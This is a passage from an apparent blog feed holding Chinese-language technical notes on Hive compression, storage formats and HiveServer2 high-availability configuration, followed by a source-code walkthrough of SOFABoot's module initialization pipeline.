class="comment">--开启mapreduce最终输出数据压缩</span></span><br><span class="line"><span class="keyword">set</span> mapreduce.output.fileoutputformat.compress=<span class="literal">true</span>;</span><br><span class="line"><span class="comment">--设置mapreduce最终数据输出压缩方式</span></span><br><span class="line"><span class="keyword">set</span> mapreduce.output.fileoutputformat.compress.codec = org.apache.hadoop.io.compress.SnappyCodec;</span><br><span class="line"><span class="comment">--设置mapreduce最终数据输出压缩为块压缩</span></span><br><span class="line"><span class="keyword">set</span> mapreduce.output.fileoutputformat.compress.type=<span class="keyword">BLOCK</span>;</span><br><span class="line"><span class="comment">--测试一下输出结果是否是压缩文件</span></span><br><span class="line"><span class="keyword">insert</span> overwrite <span class="keyword">local</span> <span class="keyword">directory</span> <span class="string">'/home/test/out/psn'</span> <span class="keyword">select</span> * <span class="keyword">from</span> psn;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="文件存储格式"><a href="#文件存储格式" class="headerlink" title="文件存储格式"></a>文件存储格式</h3><ul><li>Hive支持的存储数的格式主要有：TEXTFILE(默认)、SEQUENCEFILE、ORC、PARQUET<ul><li>TEXTFILE和SEQUENCEFILE的存储格式都是基于行存储的；ORC和PARQUET是基于列式存储的</li></ul></li><li>行存储的特点<ul><li>查询满足条件的一整行数据的时候，列存储则需要去每个聚集的字段找到对应的每个列的值，行存储只需要找到其中一个值，其余的值都在相邻地方，所以此时行存储查询的速度更快</li></ul></li><li><p>列存储的特点</p><ul><li><p>因为每个字段的数据聚集存储，在查询只需要少数几个字段的时候，能大大减少读取的数据量；每个字段的数据类型一定是相同的，列式存储可以针对性的设计更好的设计压缩算法</p><p><img src="/data/images/bigdata/hive-store-type.png" alt="行存储和列存储"></p></li></ul></li><li>存储于压缩案例(未测试)</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--创建一个非压缩的的ORC存储方式</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> log_orc_none(track_time <span class="keyword">string</span>,<span class="keyword">url</span> <span class="keyword">string</span>,session_id <span class="keyword">string</span>,referer <span class="keyword">string</span>,ip <span class="keyword">string</span>,end_user_id <span class="keyword">string</span>,city_id <span class="keyword">string</span>)</span><br><span class="line"><span class="keyword">row</span> <span class="keyword">format</span> <span class="keyword">delimited</span> <span class="keyword">fields</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">'\t'</span></span><br><span class="line"><span class="keyword">stored</span> <span class="keyword">as</span> orc tblproperties (<span class="string">"orc.compress"</span>=<span class="string">"NONE"</span>);</span><br><span class="line"><span class="comment">-- 插入数据</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">table</span> log_orc_none <span class="keyword">select</span> * <span class="keyword">from</span> log_text;</span><br><span class="line"><span class="comment">-- 查看文件大小</span></span><br><span class="line">dfs -du -h /user/hive/warehouse/log_orc_none/;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建一个SNAPPY压缩的ORC存储方式</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> log_orc_snappy(track_time <span class="keyword">string</span>,<span class="keyword">url</span> <span class="keyword">string</span>,session_id <span class="keyword">string</span>,referer <span class="keyword">string</span>,ip <span class="keyword">string</span>,end_user_id <span class="keyword">string</span>,city_id <span class="keyword">string</span>)</span><br><span class="line"><span class="keyword">row</span> <span class="keyword">format</span> <span class="keyword">delimited</span> <span class="keyword">fields</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">'\t'</span></span><br><span class="line"><span class="keyword">stored</span> <span class="keyword">as</span> orc tblproperties (<span class="string">"orc.compress"</span>=<span class="string">"SNAPPY"</span>);</span><br><span class="line"><span class="comment">-- 插入数据</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">table</span> log_orc_snappy <span class="keyword">select</span> * <span class="keyword">from</span> log_text;</span><br><span class="line"><span class="comment">-- 查看文件大小(文件大小比上面更小)</span></span><br><span class="line">dfs -du -h /user/hive/warehouse/log_orc_snappy/;</span><br></pre></td></tr></table></figure><h2 id="HA"><a href="#HA" class="headerlink" title="HA"></a>HA</h2><ul><li>基于HiveServer2 + Zookeeper完成HA</li><li>如在node03 + node04上启动HiveServer2服务(未测试)</li><li>配置如下</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>hive.metastore.warehouse.dir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>/user/hive/warehouse<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>javax.jdo.option.ConnectionURL<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>jdbc:mysql://node01:3306/hive?createDatabaseIfNotExist=true<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>javax.jdo.option.ConnectionDriverName<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>com.mysql.jdbc.Driver<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>javax.jdo.option.ConnectionUserName<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>root<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>javax.jdo.option.ConnectionPassword<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>Hello1234!<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 使用服务发现 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>hive.server2.support.dynamic.service.discovery<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>hive.server2.zookeeper.namespace<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>hiveserver2<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>hive.zookeeper.quorum<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>node01:2181,node02:2181,node03:2181<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>hive.zookeeper.client.port<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>2181<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>hive.server2.thrift.bind.host<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- node04节点的配置则改成 node04 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>node03<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>hive.server2.thrift.port<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>10001<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>beeline连接 <code>!connect jdbc:hive2://node01,node02,node03/;serviceDiscoveryMode=zooKeeper;zooKeeperNamespace=hiveserver2 root 123</code></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;The Apache Hive ™ data warehouse software facilitates rea
      
    
    </summary>
    
      <category term="bigdata" scheme="http://blog.aezo.cn/categories/bigdata/"/>
    
    
      <category term="sql" scheme="http://blog.aezo.cn/tags/sql/"/>
    
      <category term="hadoop" scheme="http://blog.aezo.cn/tags/hadoop/"/>
    
  </entry>
  
  <entry>
    <title>SOFAStack源码分析</title>
    <link href="http://blog.aezo.cn/2021/04/13/java/java-src/sofastack-src/"/>
    <id>http://blog.aezo.cn/2021/04/13/java/java-src/sofastack-src/</id>
    <published>2021-04-13T14:23:00.000Z</published>
    <updated>2022-01-18T11:10:03.266Z</updated>
    
    <content type="html"><![CDATA[<h2 id="isle-sofa-boot模块隔离"><a href="#isle-sofa-boot模块隔离" class="headerlink" title="isle-sofa-boot模块隔离"></a>isle-sofa-boot模块隔离</h2><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><ul><li><strong>初始化SOFABoot模块：主要是初始化各模块的SpringContext上下文</strong></li><li>如基于多Ark Biz启动，一般不会包含此包，各Biz间通信基于runtime-sofa-boot包完成</li></ul><h4 id="Spring启动完成后广播事件"><a href="#Spring启动完成后广播事件" class="headerlink" title="Spring启动完成后广播事件"></a>Spring启动完成后广播事件</h4><ul><li>Spring相关</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// AbstractApplicationContext.java，参考[spring-ioc-src.md#refresh方法概览](/_posts/java/java-src/spring-ioc-src.md#refresh方法概览)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">refresh</span><span class="params">()</span> <span class="keyword">throws</span> BeansException, IllegalStateException </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">this</span>.finishRefresh();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ServletWebServerApplicationContext.java</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">finishRefresh</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 调用父类</span></span><br><span class="line">    <span class="keyword">super</span>.finishRefresh();</span><br><span class="line">    WebServer webServer = <span class="keyword">this</span>.startWebServer();</span><br><span class="line">    <span class="keyword">if</span> (webServer != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.publishEvent(<span class="keyword">new</span> ServletWebServerInitializedEvent(webServer, <span class="keyword">this</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// AbstractApplicationContext.java</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">finishRefresh</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.clearResourceCaches();</span><br><span class="line">    <span class="keyword">this</span>.initLifecycleProcessor();</span><br><span class="line">    <span class="keyword">this</span>.getLifecycleProcessor().onRefresh();</span><br><span class="line">    <span class="comment">// 广播事件</span></span><br><span class="line">    <span class="keyword">this</span>.publishEvent((ApplicationEvent)(<span class="keyword">new</span> ContextRefreshedEvent(<span class="keyword">this</span>)));</span><br><span class="line">    LiveBeansView.registerApplicationContext(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>SofaModuleContextRefreshedListener.java 监听Spring启动后事件</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SofaModuleContextRefreshedListener实例化参考[sofa-boot-autoconfigure](#sofa-boot-autoconfigure)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SofaModuleContextRefreshedListener</span> <span class="keyword">implements</span> <span class="title">PriorityOrdered</span>,</span></span><br><span class="line"><span class="class">                                               <span class="title">ApplicationListener</span>&lt;<span class="title">ContextRefreshedEvent</span>&gt;,</span></span><br><span class="line"><span class="class">                                               <span class="title">ApplicationContextAware</span> </span>&#123;</span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onApplicationEvent</span><span class="params">(ContextRefreshedEvent event)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (applicationContext.equals(event.getApplicationContext())) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 处理 pipeline 流水线</span></span><br><span class="line">                pipelineContext.process();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">                SofaLogger.error(<span class="string">"process pipeline error"</span>, t);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(t);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;                                                </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="处理pipeline流水线"><a href="#处理pipeline流水线" class="headerlink" title="处理pipeline流水线"></a>处理pipeline流水线</h4><ul><li>DefaultPipelineContext.java, 其实例化参考<a href="#sofa-boot-autoconfigure">sofa-boot-autoconfigure</a></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DefaultPipelineContext</span> <span class="keyword">implements</span> <span class="title">PipelineContext</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> List&lt;PipelineStage&gt; stageList;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 依次处理所有 PipelineStage：**ModelCreatingStage、SpringContextInstallStage、ModuleLogOutputStage**</span></span><br><span class="line">        <span class="keyword">for</span> (PipelineStage pipelineStage : stageList) &#123;</span><br><span class="line">            pipelineStage.process();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="SpringContextInstallStage为例"><a href="#SpringContextInstallStage为例" class="headerlink" title="SpringContextInstallStage为例"></a>SpringContextInstallStage为例</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// AbstractPipelineStage.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractPipelineStage</span> <span class="keyword">implements</span> <span class="title">PipelineStage</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// ++++++++++++++++++ SpringContextInstallStage of SqBiz Main Start +++++++++++++++++</span></span><br><span class="line">        SofaLogger.info(<span class="string">"++++++++++++++++++ &#123;&#125; of &#123;&#125; Start +++++++++++++++++"</span>, <span class="keyword">this</span>.getClass()</span><br><span class="line">            .getSimpleName(), appName); <span class="comment">// appName 为 spring.application.name</span></span><br><span class="line">        <span class="comment">// 实际处理程序</span></span><br><span class="line">        doProcess();</span><br><span class="line">        <span class="comment">// ++++++++++++++++++ SpringContextInstallStage of SqBiz Main End +++++++++++++++++</span></span><br><span class="line">        SofaLogger.info(<span class="string">"++++++++++++++++++ &#123;&#125; of &#123;&#125; End +++++++++++++++++"</span>, <span class="keyword">this</span>.getClass()</span><br><span class="line">            .getSimpleName(), appName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// SpringContextInstallStage.java, 其实例化参考[sofa-boot-autoconfigure](#sofa-boot-autoconfigure)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SpringContextInstallStage</span> <span class="keyword">extends</span> <span class="title">AbstractPipelineStage</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">doProcess</span><span class="params">(ApplicationRuntimeModel application)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 打印模块信息</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        All activated module list(2) &gt;&gt;&gt;&gt;&gt;&gt;&gt;</span></span><br><span class="line"><span class="comment">            ├─ cn.aezo.sqbiz.sqbiz-plugin.service-consumer</span></span><br><span class="line"><span class="comment">            └─ cn.aezo.sqbiz.sqbiz-plugin.service-provider</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        Modules that could install(2) &gt;&gt;&gt;&gt;&gt;&gt;&gt;</span></span><br><span class="line"><span class="comment">            ├─ cn.aezo.sqbiz.sqbiz-plugin.service-provider</span></span><br><span class="line"><span class="comment">            └─ cn.aezo.sqbiz.sqbiz-plugin.service-consumer</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        outputModulesMessage(application);</span><br><span class="line">        <span class="comment">// 创建模块的SpringContextLoader(上下文加载器). new DynamicSpringContextLoader(applicationContext)</span></span><br><span class="line">        SpringContextLoader springContextLoader = createSpringContextLoader();</span><br><span class="line">        <span class="comment">// **加载SpringContext配置文件**</span></span><br><span class="line">        installSpringContext(application, springContextLoader);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (sofaModuleProperties.isModuleStartUpParallel()) &#123;</span><br><span class="line">            <span class="comment">// **并行刷新SpringContext，初始化Bean**</span></span><br><span class="line">            refreshSpringContextParallel(application);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 刷新SpringContext</span></span><br><span class="line">            refreshSpringContext(application);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="创建模块的SpringContextLoader-上下文加载器"><a href="#创建模块的SpringContextLoader-上下文加载器" class="headerlink" title="创建模块的SpringContextLoader(上下文加载器)"></a>创建模块的SpringContextLoader(上下文加载器)</h6><ul><li>SpringContextInstallStage.java</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> SpringContextLoader <span class="title">createSpringContextLoader</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> DynamicSpringContextLoader(applicationContext);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>DynamicSpringContextLoader.java解析spring配置文件，加载Bean。下文<a href="#加载SpringContext配置文件">加载SpringContext配置文件</a>会调用</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DynamicSpringContextLoader</span> <span class="keyword">implements</span> <span class="title">SpringContextLoader</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 加载SpringContext配置文件时会调用</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">loadSpringContext</span><span class="params">(DeploymentDescriptor deployment,</span></span></span><br><span class="line"><span class="function"><span class="params">                                  ApplicationRuntimeModel application)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// rootApplicationContext 如主模块上下文</span></span><br><span class="line">        SofaModuleProperties sofaModuleProperties = rootApplicationContext</span><br><span class="line">            .getBean(SofaModuleProperties.class);</span><br><span class="line"></span><br><span class="line">        BeanLoadCostBeanFactory beanFactory = <span class="keyword">new</span> BeanLoadCostBeanFactory(</span><br><span class="line">            sofaModuleProperties.getBeanLoadCost(), deployment.getModuleName());</span><br><span class="line">        beanFactory</span><br><span class="line">            .setAutowireCandidateResolver(<span class="keyword">new</span> QualifierAnnotationAutowireCandidateResolver());</span><br><span class="line">        GenericApplicationContext ctx = sofaModuleProperties.isPublishEventToParent() ? <span class="keyword">new</span> GenericApplicationContext(</span><br><span class="line">            beanFactory) : <span class="keyword">new</span> SofaModuleApplicationContext(beanFactory);</span><br><span class="line">        <span class="comment">// 获取激活的环境类型</span></span><br><span class="line">        String activeProfiles = sofaModuleProperties.getActiveProfiles();</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.hasText(activeProfiles)) &#123;</span><br><span class="line">            String[] profiles = activeProfiles.split(SofaBootConstants.PROFILE_SEPARATOR);</span><br><span class="line">            ctx.getEnvironment().setActiveProfiles(profiles);</span><br><span class="line">        &#125;</span><br><span class="line">        setUpParentSpringContext(ctx, deployment, application);</span><br><span class="line">        <span class="keyword">final</span> ClassLoader moduleClassLoader = deployment.getClassLoader();</span><br><span class="line">        ctx.setClassLoader(moduleClassLoader);</span><br><span class="line">        CachedIntrospectionResults.acceptClassLoader(moduleClassLoader);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// set allowBeanDefinitionOverriding</span></span><br><span class="line">        ctx.setAllowBeanDefinitionOverriding(sofaModuleProperties.isAllowBeanDefinitionOverriding());</span><br><span class="line"></span><br><span class="line">        ctx.getBeanFactory().setBeanClassLoader(moduleClassLoader);</span><br><span class="line">        ctx.getBeanFactory().addPropertyEditorRegistrar(<span class="keyword">new</span> PropertyEditorRegistrar() &#123;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">registerCustomEditors</span><span class="params">(PropertyEditorRegistry registry)</span> </span>&#123;</span><br><span class="line">                registry.registerCustomEditor(Class.class, <span class="keyword">new</span> ClassEditor(moduleClassLoader));</span><br><span class="line">                registry.registerCustomEditor(Class[].class,</span><br><span class="line">                    <span class="keyword">new</span> ClassArrayEditor(moduleClassLoader));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        deployment.setApplicationContext(ctx);</span><br><span class="line"></span><br><span class="line">        XmlBeanDefinitionReader beanDefinitionReader = <span class="keyword">new</span> XmlBeanDefinitionReader(ctx);</span><br><span class="line">        beanDefinitionReader.setValidating(<span class="keyword">true</span>);</span><br><span class="line">        beanDefinitionReader.setNamespaceAware(<span class="keyword">true</span>);</span><br><span class="line">        beanDefinitionReader</span><br><span class="line">            .setBeanClassLoader(deployment.getApplicationContext().getClassLoader());</span><br><span class="line">        beanDefinitionReader.setResourceLoader(ctx);</span><br><span class="line">        <span class="comment">// 加载配置文件中定义的Bean</span></span><br><span class="line">        loadBeanDefinitions(deployment, beanDefinitionReader);</span><br><span class="line">        addPostProcessors(beanFactory);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="加载SpringContext配置文件"><a 